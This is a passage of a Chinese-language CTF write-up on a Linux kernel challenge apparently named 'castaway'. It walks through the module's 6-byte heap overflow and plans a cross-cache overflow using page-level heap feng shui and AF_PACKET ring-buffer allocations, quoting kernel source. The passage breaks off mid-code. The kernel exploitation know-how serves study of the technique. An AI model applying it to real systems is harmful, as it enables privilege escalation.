<code>KMEM_CACHE</code>是一个创建 <code>kmem_cache</code>的宏，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Please use this macro to create slab caches. Simply specify the</span><br><span class="hljs-comment"> * name of the structure and maybe some flags that are listed above.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The alignment of the struct determines object alignment. If you</span><br><span class="hljs-comment"> * f.e. add ____cacheline_aligned_in_smp to the struct declaration</span><br><span class="hljs-comment"> * then the objects will be properly aligned in SMP configurations.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KMEM_CACHE(__struct, __flags)\</span><br><span class="hljs-meta">kmem_cache_create(#__struct, sizeof(struct __struct),\</span><br><span class="hljs-meta">__alignof__(struct __struct), (__flags), NULL)</span><br></code></pre></td></tr></table></figure><p>该 <code>kmem_cache</code>的object大小为512字节，可以注意到创建 <code>kmem_cache</code>时带有 <code>SLAB_ACCOUNT|SLAB_PANIC</code>这个flag，我们查看内核地的配置发现 <code>CONFIG_MEMCG_KMEM=y</code>，因此通过该 <code>kmem_cache</code>创建的slab将会被归于一个单独的slab池当中，从而造成一个完全隔离的环境，而这里为了凸显这个 “完全”，同样的内核配置中 <code>CONFIG_SLAB_MERGE_DEFUALT</code>选项被禁止，以防通过使用 <a href="https://elixir.bootlin.com/linux/latest/source/mm/slab_common.c#L186"><code>find_mergeable</code>函数</a> 来复用同样类似的标志以及大小的 <code>kmem_cache</code></p><h4 id="castaway-ioctl"><a href="#castaway-ioctl" class="headerlink" title="castaway_ioctl"></a>castaway_ioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int64_t</span> idx;<br>    <span class="hljs-type">uint64_t</span> size;<br>    <span class="hljs-type">char</span> *buf;    <br>&#125;<span class="hljs-type">user_req_t</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">castaway_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br>    <span class="hljs-type">user_req_t</span> req;<br>    <span class="hljs-type">long</span> ret = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (cmd != ALLOC &amp;&amp; copy_from_user(&amp;req, (<span class="hljs-type">void</span> *)arg, <span class="hljs-keyword">sizeof</span>(req)))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    mutex_lock(&amp;castaway_lock);<br>    <span class="hljs-keyword">switch</span> (cmd)<br>    &#123;<br>        <span class="hljs-keyword">case</span> ALLOC:<br>            ret = castaway_add();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> EDIT:<br>            ret = castaway_edit(req.idx, req.size, req.buf);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            ret = <span class="hljs-number">-1</span>;<br>    &#125;<br>    mutex_unlock(&amp;castaway_lock);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>给出了用户传参规则，ioctl实现了两种功能，下一个</p><h4 id="castaway-add"><a href="#castaway-add" class="headerlink" title="castaway_add"></a>castaway_add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">castaway_add</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-keyword">if</span> (castaway_ctr &gt;= MAX)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> failure_add;<br>    &#125;<br>    idx = castaway_ctr++;<br>    castaway_arr[idx] = kmem_cache_zalloc(castaway_cachep, GFP_KERNEL_ACCOUNT);<br><br>    <span class="hljs-keyword">if</span> (!castaway_arr[idx])<br>    &#123;<br>        <span class="hljs-keyword">goto</span> failure_add;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> idx;<br><br>    failure_add:<br>    printk(KERN_INFO <span class="hljs-string">&quot;castaway chunk allocation failed\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过自带的 <code>kmem_cache</code>来分配一个obj，然后将其地址给到全局的object数组当中</p><h4 id="castaway-edit"><a href="#castaway-edit" class="headerlink" title="castaway_edit"></a>castaway_edit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> pad[OVERFLOW_SZ];<br>    <span class="hljs-type">char</span> buf[];<br>&#125;<span class="hljs-type">castaway_t</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">castaway_edit</span><span class="hljs-params">(<span class="hljs-type">int64_t</span> idx, <span class="hljs-type">uint64_t</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-type">char</span> temp[CHUNK_SIZE];<br>    <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= MAX || !castaway_arr[idx])<br>    &#123;<br>        <span class="hljs-keyword">goto</span> edit_fail;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (size &gt; CHUNK_SIZE || copy_from_user(temp, buf, size))<br>    &#123;<br>        <span class="hljs-keyword">goto</span> edit_fail;<br>    &#125;<br>    <span class="hljs-built_in">memcpy</span>(castaway_arr[idx]-&gt;buf, temp, size);<br><br>    <span class="hljs-keyword">return</span> size;<br><br>    edit_fail:<br>    printk(KERN_INFO <span class="hljs-string">&quot;castaway chunk editing failed\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们每次调用 <code>memcpy</code>都是从object的第6字节才开始拷贝一整个块的数据，因此存在6字节的溢出</p><p>再次查看配置，其中也开启了下面这两个好伙伴</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_SLAB_FREELIST_RANDOM</span>=y    <br><span class="hljs-attr">CONFIG_SLAB_FREELIST_HARDENED</span>=y<br></code></pre></td></tr></table></figure><h3 id="2-利用思路"><a href="#2-利用思路" class="headerlink" title="2.利用思路"></a>2.利用思路</h3><p>按照出题人所说，题目在基本上内核保护全开的情况下，漏洞模块中的 <code>kmem_cache</code>存在隔离且无法复用，并且内容当中不存在任何指针，<code>free_object</code>的 <code>freelist</code>指针也并不在开头而是被放在了中间，给到我们的条件就仅仅只有一个六字节的溢出，似乎已经到了绝境，但是是否有一种方法来打破这层囚笼呢？</p><p>事实上确实存在这一手法，既然说我们分配的 <code>object</code>已经隔离了起来，不可能利用不同 <code>kmem_cache</code>之间的 <code>object</code>来实现利用，但是继续往底层考量，我们要知道Linux内核分配，在slub算法之前还存在一个算法，那就是伙伴系统（Buddy System），一切以页为单位的分配均是从他这儿来分配，当然我们的 <code>kmem_cache</code>也不例外，如果我们能进行恰当的布局，就可以使得不同的 <code>kmem_cache</code>相邻，此时我们就可能造成隔离 <code>kmem_cache</code>之间object的溢出！</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/cc11728b4710b912c72ab0cd85fdfc039245221d.jpg"></p><p>上图就是其中大致的场景，如果我们的<code>vulnerable kmem_cache</code>同其他通用 <code>kmem_cache</code>出现隔离，我们仍能利用buddy system分配连续块的特性来造成不同结构间的溢出,关于该技巧的细节，可以通过阅读下面博客进行理解</p><p><a href="https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game">AUTOSLAB应对跨缓存利用的措施</a></p><p><a href="https://etenal.me/archives/1825">CVE-2022-27666 Page-Level heap fengshui</a></p><p><a href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">Google project zero CVE-2017-7308</a></p><p>事实上BitsByWill师傅也推荐了该博客</p><p><img src="https://grsecurity.net/img/cross_cache_overflow.png"></p><p>这里直观上来看就好像是将我们平时用到的object提升了一个量级，变成了slab了</p><p>当一个slab页面被释放给伙伴系统时，考虑到该内存页面应该被内核回收，它将在稍后的某个时刻被重用。 <code>cross_cache_overlapping</code> 的技术是释放slab页中的所有 <code>memory slot</code>，或者叫做我们平时讨论的 <code>object</code>  ，强制释放slab页。 然后，喷射另一种类型的对象来分配新的slab页面，以回收释放的slab页面。 如果攻击成功，释放的对象的内存将被另一种类型的对象占用。 过去，利用Linux内核内存安全漏洞进行跨缓存攻击的做法并不多见。 在通用缓存中这样做不仅没有必要，而且不稳定。 特别是对于经常使用的通用缓存，攻击会遭受分配不可控带来的噪音,也就是在分配过程中可能分配多种不同类型的结构体。 例如，当内核进行未知分配时，slab 页中所有 <code>memory slot</code> 的释放都会失败，从而导致无法通过另一个slab 页回收该slab 页。 与在通用缓存上执行交叉缓存相比，在专用对象缓存上几乎没有噪音。 这是因为每个分配都会进入自己的缓存，包括来自内核的未知分配，这减少了缓存中未知分配的可能性。 这样，攻击者就可以可靠地释放专用缓存的slab页面来执行跨缓存攻击。</p><p>这么说来，这个专用缓存对象对我们来说，既是挑战，也是馈赠~</p><p>既然我们准备使用跨缓存对象进行溢出，我们就首先需要堆喷我们的 <code>vulnerable object</code>，同时我们也要堆喷 <code>victim object</code>，并且我们要保证 <code>victim object</code>所位于的 <code>slab</code>要恰好位于 <code>vulnerable object</code>的下方</p><p>我们如何来达成上述条件呢，那就需要使用到 <code>Page-Level heap fengshui</code>,也就是页级堆风水</p><h3 id="3-页级分配原语"><a href="#3-页级分配原语" class="headerlink" title="3.页级分配原语"></a>3.页级分配原语</h3><p>该节参考 <a href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">Google Project zero writeup</a></p><h4 id="AF-PACKET-sockets基础知识"><a href="#AF-PACKET-sockets基础知识" class="headerlink" title="AF_PACKET sockets基础知识"></a><code>AF_PACKET sockets</code>基础知识</h4><p>首先就是对于 <code>AF_PACKET sockets</code>的基本解释</p><p><code>AF_PACKET seckets</code> 允许用户在设备驱动程序级别发送或接收数据包,要创建 <code>AF_PACKET sockets</code>，进程必须在管理其网络命名空间的用户命名空间中具有 <code>CAP_NET_RAW</code> 功能。 应该注意的是，如果内核启用了非特权用户命名空间，那么非特权用户就能够创建数据包套接字。</p><p>他在大众的认知下往往被常用于 <code>tcpdump</code>对于网络接口包的嗅探，google团队也给出了一个例子，是利用strace来跟踪后面指令使用到的系统调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">strace tcpdump -i eth0</span><br>...<br>socket(PF_PACKET, SOCK_RAW, 768)        = 3<br>...<br>bind(3, &#123;sa_family=AF_PACKET, proto=0x03, if2, pkttype=PACKET_HOST, addr(0)=&#123;0, &#125;, 20) = 0<br>...<br>setsockopt(3, SOL_PACKET, PACKET_VERSION, [1], 4) = 0<br>...<br>setsockopt(3, SOL_PACKET, PACKET_RX_RING, &#123;block_size=131072, block_nr=31, frame_size=65616, frame_nr=31&#125;, 16) = 0<br>...<br>mmap(NULL, 4063232, PROT_READ|PROT_WRITE, MAP_SHARED, 3, 0) = 0x7f73a6817000<br>...<br></code></pre></td></tr></table></figure><p>这里不放我自己虚拟机的情况是因为我的eth0没怎么经常收发包（bushi</p><p>之后也给出利用的具体步骤</p><ol><li>首先创建出一个<code>socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))</code></li><li>将该 <code>socket</code>绑定在eth0接口</li><li>环形缓冲区版本通过 <code>socket option:PACKET_VERSION</code>来设置为 <code>TPACKET_V2</code></li><li>使用 <code>socket option:PACKET_RX_RING</code> 来创建该环形缓冲区</li><li>将环形缓冲区映射在用户空间</li></ol><p>经过这一系列系统调用，linux内核将会把通过网络接口eth0的网络packet放入环形缓冲区，然后 <code>tcpdump</code> 再从该缓冲区在用户空间的映射来读取信息</p><p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8sUz4Vc6b3HGdP_k6atb9ll9WozOxVz4A5Ph4_nSHew5-l6CpLGMZrnhYlV33JtUROTInR3kNi9caxvS6v6s-J9OVRKH3sI9XRiRlNCl3jXvDIqKzQ8tcmHVcU62QqTcB01Wg1m-CX2INOpoZqNWQgfA-67A5RFyKsOP59fA5W4iuASS2U56jhLCH/s640/ak01.png"></p><h4 id="AF-PACKET-sockets内核体现"><a href="#AF-PACKET-sockets内核体现" class="headerlink" title="AF_PACKET sockets内核体现"></a><code>AF_PACKET sockets</code>内核体现</h4><p>首先当我们创建一个 <code>AF_PACKET socket</code>的时候，会在内核创建下述结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_sock</span> &#123;</span><br><span class="hljs-comment">/* struct sock has to be the first member of packet_sock */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span><span class="hljs-title">sk</span>;</span><br><br>...<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_ring_buffer</span><span class="hljs-title">rx_ring</span>;</span> <span class="hljs-comment">//通过setsocketopt选项PACKET_RX_RING(recive)来创建 </span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_ring_buffer</span><span class="hljs-title">tx_ring</span>;</span> <span class="hljs-comment">//通过setcosketopt选项PACKET_TX_RING(transmit)来创建</span><br><br>...<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span><span class="hljs-title">tp_version</span>;</span> <span class="hljs-comment">//用来设置环形缓冲区版本</span><br><br>...<br><br><span class="hljs-type">int</span>(*xmit)(<span class="hljs-keyword">struct</span> sk_buff *skb);<br><br>...<br>&#125;;<br></code></pre></td></tr></table></figure><p>下面是对于环形缓冲区数据结构体 <code>struct packet_ring_buffer</code>的解释</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> &#123;</span><br><span class="hljs-type">char</span> *buffer;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_ring_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span>*<span class="hljs-title">pg_vec</span>;</span><br><br>...<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*rx_owner_map;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_kbdq_core</span><span class="hljs-title">prb_bdqc</span>;</span><br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里我们的 <code>pg_vec</code>字段是一个指向 <code>struct pgv</code>结构体的指针，然后每一个 <code>struct pgv</code>结构体都包含着一个指向某个 <code>block</code>的指针，如下google团队图</p><p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7Smv0slKCCmVb3uAnY2vJ07NaaBscV0ZKY8-RD3ysJz9DY4YQOvMlkP7L9v66r8NwXKdypSOhWSuFstZvXIC6vhs0CZzFI2fgX6htfvs6aZrAwZrwV1HOgX-2eNWf3s6im3zcSmqMe3eaIOyNdBoP4VBRVpaefbxHAwaWeRywW9szC2rxqjuEJEED/s544/ak03.png"></p><p>下面我们来看环形缓冲区其中的 <code>prb_bdqc</code>字段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* kbdq - 内核块描述队列 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_kbdq_core</span> &#123;</span><br><br>...<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>blk_sizeof_priv; <span class="hljs-comment">//标志着每个block中私有区域的大小</span><br> <br>...<br><br><span class="hljs-type">char</span>*nxt_offset; <span class="hljs-comment">//指向活动block内， 同时指向下一个packet保存的地方</span><br><br>...<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_list</span> <span class="hljs-title">retire_blk_timer</span>;</span> <span class="hljs-comment">//描述了在超时时退出当前块的定时器</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_list</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span><span class="hljs-title">entry</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>expires;<br><span class="hljs-type">void</span>(*function)(<span class="hljs-keyword">struct</span> timer_list *);<br>u32flags;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_LOCKDEP</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lockdep_map</span><span class="hljs-title">lockdep_map</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="packet-set-ring-创建ring-buffer"><a href="#packet-set-ring-创建ring-buffer" class="headerlink" title="packet_set_ring()创建ring buffer"></a><code>packet_set_ring()</code>创建ring buffer</h4><p>我们一般可以通过 <code>packet_setsocketopt</code>函数并且附带特定的socket选项来进行处理socket事件，例如使用 <code>PACKET_VERSION</code>选项来设置环形缓冲区版本</p><p>当我们设置 <code>PACKET_RX_RING</code>来创建负责接收的环形缓冲区，其最终会使用 <code>packet_set_ring()</code>函数来进行处理，如下是较为重要部分</p><p>首先他会进行一系列检查</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xl">err = -EINVAL;<br><span class="hljs-function"><span class="hljs-title">if</span> (unlikely((int)req-&gt;</span>tp_block_size &lt;= <span class="hljs-number">0</span>))<br>goto out;<br><span class="hljs-function"><span class="hljs-title">if</span> (unlikely(!PAGE_ALIGNED(req-&gt;</span>tp_block_size)))<br>goto out;<br><span class="hljs-function"><span class="hljs-title">min_frame_size</span> = po-&gt;</span><span class="hljs-function"><span class="hljs-title">tp_hdrlen</span> + po-&gt;</span>tp_reserve;<br><span class="hljs-function"><span class="hljs-title">if</span> (po-&gt;</span>tp_version &gt;= TPACKET_V3 &amp;&amp;<br>    <span class="hljs-function"><span class="hljs-title">req</span>-&gt;</span>tp_block_size &lt;<br>    BLK_PLUS_PRIV((<span class="hljs-function"><span class="hljs-title">u64</span>)req_u-&gt;</span>req3.tp_sizeof_priv) + min_frame_size)<br>goto out;<br><span class="hljs-function"><span class="hljs-title">if</span> (unlikely(req-&gt;</span>tp_frame_size &lt; min_frame_size))<br>goto out;<br><span class="hljs-function"><span class="hljs-title">if</span> (unlikely(req-&gt;</span>tp_frame_size &amp; (TPACKET_ALIGNMENT - <span class="hljs-number">1</span>)))<br>goto out;<br><br><span class="hljs-function"><span class="hljs-title">rb</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">frames_per_block</span> = req-&gt;</span><span class="hljs-function"><span class="hljs-title">tp_block_size</span> / req-&gt;</span>tp_frame_size;<br><span class="hljs-function"><span class="hljs-title">if</span> (unlikely(rb-&gt;</span>frames_per_block == <span class="hljs-number">0</span>))<br>goto out;<br><span class="hljs-function"><span class="hljs-title">if</span> (unlikely(rb-&gt;</span><span class="hljs-function"><span class="hljs-title">frames_per_block</span> &gt; UINT_MAX / req-&gt;</span>tp_block_nr))<br>goto out;<br><span class="hljs-function"><span class="hljs-title">if</span> (unlikely((rb-&gt;</span><span class="hljs-function"><span class="hljs-title">frames_per_block</span> * req-&gt;</span>tp_block_nr) !=<br><span class="hljs-function"><span class="hljs-title">req</span>-&gt;</span>tp_frame_nr))<br>goto out;<br><br></code></pre></td></tr></table></figure><p>然后就会为环形缓冲区分配 <code>block</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">err = -ENOMEM;<br><span class="hljs-keyword">order</span> = get_order(req-&gt;tp_block_size);<br>pg_vec = alloc_pg_vec(req, <span class="hljs-keyword">order</span>);<br><span class="hljs-keyword">if</span> (unlikely(!pg_vec))<br>goto <span class="hljs-keyword">out</span>;<br></code></pre></td></tr></table></figure><p>该 <code>alloc_pg_vec</code>函数实际上调用了内核当中的内存分配函数,这里注意是 <code>block_nr</code>个 咱们提供的 <code>order</code>大小,这里的order取决于咱们的 <code>tp_block_size</code>  ，也就是 BitsByWill师傅提到他的原因</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pgv</span> *<span class="hljs-built_in">alloc_pg_vec</span>(<span class="hljs-keyword">struct</span> tpacket_req *req, <span class="hljs-type">int</span> order)<br>&#123;<br>...<br><br>pg_vec = <span class="hljs-built_in">kcalloc</span>(block_nr, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(!pg_vec))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; block_nr; i++) &#123;<br>pg_vec[i].buffer = <span class="hljs-built_in">alloc_one_pg_vec_page</span>(order);<br><br>...<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<span class="hljs-title">alloc_one_pg_vec_page</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> order)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> *buffer;<br><span class="hljs-type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |<br>  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;<br><br>buffer = (<span class="hljs-type">char</span> *) __get_free_pages(gfp_flags, order);<br><span class="hljs-keyword">if</span> (buffer)<br><span class="hljs-keyword">return</span> buffer;<br><br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>在最后 <code>packet_set_ring()</code>函数会调用 <code>init_prb_bdqc()</code>函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">switch (po-&gt;tp_version) &#123;<br>case TPACKET_V3:<br><span class="hljs-comment">/* Block transmit is not supported yet */</span><br><span class="hljs-keyword">if</span> (!tx_ring) &#123;<br>init<span class="hljs-constructor">_prb_bdqc(<span class="hljs-params">po</span>, <span class="hljs-params">rb</span>, <span class="hljs-params">pg_vec</span>, <span class="hljs-params">req_u</span>)</span>;<span class="hljs-operator"></span><br><span class="hljs-operator"></span><br><span class="hljs-operator">...</span><br><span class="hljs-operator"></span><br><span class="hljs-operator"></span>&#125;<br></code></pre></td></tr></table></figure><p><code>init_prb_bdqc</code>函数的功能是将环形缓冲区的参数复制到 <code>sturct pack_ring_buffer.prb_bdqc</code>字段，根据计算设置参数，然后设置 <code>block retire timer</code>,最后调用 <code>prb_open_block</code>函数来初始化第一个 <code>block</code></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs xl">static void init_prb_bdqc(struct packet_sock *po,<br>struct packet_ring_buffer *rb,<br>struct pgv *pg_vec,<br>union tpacket_req_u *req_u)<br>&#123;<br>struct 